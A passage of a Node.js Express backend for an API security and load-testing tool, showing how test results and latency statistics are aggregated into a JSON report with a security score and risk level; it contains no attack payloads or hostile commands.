    const inconclusive = results.filter((item) => item.status === "Inconclusive").length;
    const criticalFindings = results.filter((item) => item.severity === "Critical").length;
    const mediumHighFindings = results.filter((item) => item.severity === "High" || item.severity === "Medium").length;
    const totalTests = results.length;
    const securityScore = totalTests === 0 ? 0 : Math.round(((passed + inconclusive * 0.85) / totalTests) * 100);
    const totalLoadRequests = load.requests?.total || 0;
    const status2xx = load["2xx"] || 0;
    const successRatePct = totalLoadRequests === 0 ? "0.00" : ((status2xx / totalLoadRequests) * 100).toFixed(2);

    const report = {
      title: "API Security Test Report",
      generatedAt: new Date().toISOString(),
      endpoint: { url: baseTargetUrl, method: normalizedMethod },
      summary: {
        totalTests,
        passed,
        failed,
        inconclusive,
        securityScore,
        riskLevel: criticalFindings > 0 ? "High" : mediumHighFindings > 0 ? "Medium" : "Low",
      },
      performance: {
        avgLatencyMs: (load.latency?.average || 0).toFixed(2),
        latencyMinMs: (load.latency?.min || 0).toFixed(2),
        latencyP50: (load.latency?.p50 || 0).toFixed(2),
        latencyP90: (load.latency?.p90 || 0).toFixed(2),
        latencyP99: (load.latency?.p99 || 0).toFixed(2),
        latencyMaxMs: (load.latency?.max || 0).toFixed(2),
        requestsPerSec: (load.requests?.average || 0).toFixed(2),
        throughputKbPerSec: ((load.throughput?.average || 0) / 1024).toFixed(2),
        totalRequests: totalLoadRequests,
        status2xx: status2xx,
        status4xx: load["4xx"] || 0,
        status5xx: load["5xx"] || 0,
        successRatePct: successRatePct,
        errorCount: load.errors ?? 0,
        timeouts: load.timeouts ?? 0,
        totalBytes: load.bytes?.total || 0,
      },
      findings: results.map((item) => ({
        testType: item.type,
        status: item.status,
        findingType: item.findingType,
        severity: item.severity,
        note: item.note,
        message: item.response.message,
        rawResponse: item.response.raw,
        statusCode: item.response.statusCode,
        url: item.url,
        timestamp: item.timestamp,
        elapsedMs: item.elapsedMs,
        payload: item.payload,
      })),
    };
    const ruleSummary = generateAnalysisSummary({
      summary: report.summary,
      performance: report.performance,
      findings: report.findings,
    });
    report.analysis = {
      ...ruleSummary,
      source: "rules",
    };

    res.json({
      report,
      url: baseTargetUrl,
      method: normalizedMethod,
      avgLatency: load.latency?.average || 0,
      requestsPerSec: load.requests?.average || 0,
      totalRequests: load.requests?.total || 0,
      errorCount: load.errors ?? 0,
      timeoutCount: load.timeouts ?? 0,
      securityResults: results,
      status: "Zavrseno",
    });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Greška na serveru." });
  } finally {
    activeTests--;
  }
});

app.listen(PORT, () => console.log(`Backend radi na portu ${PORT}`));
